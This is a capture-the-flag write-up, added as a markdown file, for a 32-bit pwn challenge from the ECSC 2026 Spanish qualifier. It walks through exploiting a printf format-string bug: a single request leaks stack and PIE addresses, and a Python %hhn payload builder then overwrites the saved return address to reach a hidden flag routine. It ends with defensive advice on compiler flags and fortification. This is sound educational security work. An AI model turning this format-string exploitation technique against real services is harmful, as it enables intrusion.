@@ -1,0 +1,153 @@
+---
+title: "Reto07_TelemetryGate"
+description: "A zip with a stripped 32-bit ELF, its libc.so.6 and ld-linux.so.2, and a service on 51.49.145.38:20007. Connecting gives you a fake industrial console."
+date: 2026-08-04T12:02:00.000Z
+tags: ["ctf", "pwn", "ecsc26"]
+ctf: "ECSC 2026 Spanish Qualifier (INCIBE)"
+category: "Pwn"
+---
+
+**CTF:** ECSC 2026 Spanish Qualifier (INCIBE)  
+**Category:** Pwn  
+**Difficulty:** 500  
+
+## Challenge
+
+A zip with a stripped 32-bit ELF, its `libc.so.6` and `ld-linux.so.2`, and a service on `51.49.145.38:20007`. Connecting gives you a fake industrial console:
+
+```text
+==================================================
+[SCADA-MON] Modbus Sensor Logging Gateway v3.12
+Status: ONLINE | Security Level: HIGH
+==================================================
+scada>
+```
+
+Everything is turned on:
+
+```text
+Arch:       i386-32-little
+RELRO:      Full RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        PIE enabled
+```
+
+## Solution
+
+### The bug
+
+The console loop is one function at `0x12e0`. It reads up to 255 bytes, bails out on `exit`, and then does this:
+
+```asm
+1403:  8d 85 f4 fe ff ff   lea    -0x10c(%ebp),%eax
+1409:  50                  push   %eax
+140a:  e8 51 fc ff ff      call   1060 <printf@plt>
+```
+
+One argument. `printf(user_input)` with no format string of its own, inside a `while(true)`. That is the whole vulnerability, and the infinite loop is the generous part: I get unlimited attempts on the same process image, so I can leak first and write second without reconnecting.
+
+Then I looked at what the mitigations actually cost me. Full RELRO means the GOT is read-only, so the usual `%n` over `printf@got` is dead. NX means no shellcode. PIE means I do not know where anything is. But a format string gives an arbitrary *read* as well as an arbitrary write, and the read solves PIE. And the canary protects against a contiguous overflow. It does nothing about a targeted write that skips over it. So the target is the saved return address, and there is somewhere useful to point it: the function at `0x123d` opens `flag.txt`, `fgets` it and `puts` it, and nothing in the program ever calls it.
+
+### Two leaks in one request
+
+I needed a stack address (to know where to write) and a code address (to defeat PIE). Both come out of one line.
+
+The function starts with a piece of dead code that turns out to be the author's gift:
+
+```asm
+1300:  lea    -0x10c(%ebp),%eax        ; eax = buffer
+1306:  mov    %eax,-0x118(%ebp)        ; store a pointer to it on the stack
+130c:  lea    -0x118(%ebp),%eax
+1312:  mov    %eax,-0x114(%ebp)
+1318:  cmpl   $0x0,-0x114(%ebp)
+131f:  jne    133a                     ; always taken
+```
+
+The `printf("%p", ...)` behind that `jne` never runs, but the store at `0x1306` is unconditional. A pointer to my own buffer is sitting on the stack for free.
+
+Working out which format index that is, from the call site. After the prologue `esp = ebp-0x118`; then `sub $0xc,%esp` and the `push %eax` put the format pointer at `ebp-0x128`. So argument *N* lives at `ebp-0x128+4N`:
+
+| index | address | contents |
+|---|---|---|
+| 4 | `ebp-0x118` | pointer to the buffer, courtesy of `0x1306` |
+| 7 | `ebp-0x10c` | start of the buffer, where my own input begins |
+| 75 | `ebp+4` | saved return address |
+
+Index 75 holds the return into `main`, which is `0x14b8`, the instruction right after `call 12e0`:
+
+```asm
+14b3:  e8 28 fe ff ff      call   12e0
+14b8:  b8 00 00 00 00      mov    $0x0,%eax
+```
+
+So one request does everything:
+
+```python
+io.sendline(b"%4$p|%75$p|")
+```
+
+`leak2 - 0x14b8` is the PIE base, and `base + 0x123d` is the flag routine. I asserted the base came out page-aligned as a sanity check on the whole derivation.
+
+### The offset I got wrong
+
+This is the part that cost me time, so it is worth writing down. Ghidra's decompilation declares the buffer as
+
+```c
+char local_110 [256];
+```
+
+I read that name as `ebp-0x110` and built my first slot-dumping script on it, which then computed an implied `ebp` of `buf+0x110` and an implied saved-EIP address of `buf+0x114`. Both are four bytes too high, and `buf+0x114` is `ebp+8`, not the return address at all: it is the lowest dword of the sixteen bytes `main` reserves with `sub $0x10,%esp` at `0x1455` and never reads back, so a write there would have silently done nothing.
+
+The name was mine to misread, not Ghidra's to get wrong. Ghidra numbers locals from the stack pointer at function entry, and the prologue's `push %ebp` puts `ebp` four bytes below that, so `local_N` sits at `ebp+4-N`. Three variables in the same decompilation pin the convention down against the disassembly: `int local_10` is the canary, stored at `ebp-0xc` by `0x12fb`; `char local_50 [64]` is the `fgets` buffer in the flag routine, addressed at `ebp-0x4c` by `0x12a0`; and `ssize_t local_114` is the `read` return value, stored at `ebp-0x110` by `0x13c1`. So `local_110[256]` is `ebp-0x10c`, and `ebp-0x110` is a different variable entirely.
+
+The instructions say the same thing. All five references to the buffer in the function (the `lea` at `0x1300`, the one feeding `read` at `0x13b0`, the pointer arithmetic at `0x13d0`, the one feeding `strncmp` at `0x13ed`, and the one feeding `printf` at `0x1403`) are `-0x10c(%ebp)`. Decompiler and disassembler agreed the whole time.
+
+So `ebp = buf + 0x10c` and the saved return address is at **`buf + 0x110`**, which is index 75 by the argument arithmetic above. The frame offset and the index arithmetic agreeing is what I wanted before firing a write.
+
+### Four single-byte writes
+
+I have a 4-byte address to place. The naive approach is two `%hn` half-word writes, but `%n` counts characters actually emitted, so a high half-word can mean padding out up to 65535 characters for one write, about 128 KB of output for the pair. Byte-at-a-time with `%hhn` is far cheaper: sorted ascending the four pads sum to the largest byte value, so at most 255 characters of padding in total. Replaying the builder below over every page-aligned PIE base, the payload sent is always 80 bytes and `printf` emits between 97 and 295 characters.
+
+The addresses to write to have to be inside my own buffer at a known index. I reserve 64 bytes for the specifiers, which is 16 dwords, so the four addresses start at index `7 + 16 = 23`:
+
+```python
+idx0 = BUF_IDX + PAD // 4          # 7 + 16 = 23
+targets = [(saved_eip + i, (win >> (8 * i)) & 0xFF, idx0 + i) for i in range(4)]
+
+fmt, written = b"", 0
+for _addr, val, idx in sorted(targets, key=lambda t: t[1]):
+    delta = (val - written) % 0x100
+    if delta:
+        fmt += b"%%%dc" % delta
+        written += delta
+    fmt += b"%%%d$hhn" % idx
+
+payload = fmt.ljust(PAD, b"A") + b"".join(p32(a) for a, _, _ in targets)
+```
+
+Sorting the four bytes ascending matters: the character counter only goes up, so writing the smallest byte first means every `delta` is a forward step and no write needs to wrap all the way around 256.
+
+The canary at `ebp-0xc` is never touched (the writes land only on `ebp+4..ebp+7`), so the check at `0x1430` still passes:
+
+```asm
+1430:  mov    -0xc(%ebp),%eax
+1433:  sub    %gs:0x14,%eax
+143a:  je     1441
+143c:  call   14e0 <__stack_chk_fail>
+1441:  mov    -0x4(%ebp),%ebx
+1444:  leave
+1445:  ret
+```
+
+Then I typed `exit`. `strncmp` breaks the loop, the epilogue runs, and the `ret` at `0x1445` pops the address I planted instead of `0x14b8`. The process walks into the flag routine, `fopen`s `flag.txt`, and prints it.
+
+Flag: `flag{ECSC2026_fmt_stack_chain_production_key}`
+
+## Takeaway
+
+`printf(user_input)` is the whole bug, and it is a bug class that has been well understood since 2000 and still ships. The correct code is `printf("%s", user_input)` or `fputs(user_input, stdout)`: one extra argument. GCC and Clang will both find this for you with `-Wformat-security`, and it is worth promoting to `-Werror=format-security` in any build that handles network input, because the warning is trivially ignorable and the bug is not. `_FORTIFY_SOURCE=2` also refuses `%n` when the format string lives in writable memory, which would have blocked this exploit outright; the binary was built without it.
+
+What this challenge illustrates well is that mitigations are not additive against the right primitive. Full RELRO, NX, PIE and a stack canary were all enabled, and none of them mattered, because a format string is simultaneously an arbitrary read and an arbitrary write. The read cancels PIE. The write picks its own target, so it steps over the canary rather than through it, and NX is irrelevant when the address you jump to is already executable code in the image. The canary defends one specific thing (sequential overflow of a stack buffer), and this was not that.
+
+The secondary lesson is cheaper and more general: know what your decompiler's names actually mean before you do arithmetic on them. Ghidra's `local_110` is not `ebp-0x110`. Its local names count from the stack pointer at function entry, so that variable is `ebp-0x10c`, which is exactly what every `lea` in the function says, and `ebp-0x110` belongs to a different variable in the same frame. Ghidra and the disassembly never disagreed; I lost the time to reading a label as an offset. Four bytes was the difference between aiming at the return address and aiming at dead scratch space in `main`, and one `lea` in the disassembly resolves it in a second. When a number has to be right to the byte, take it from the instruction that computes it.
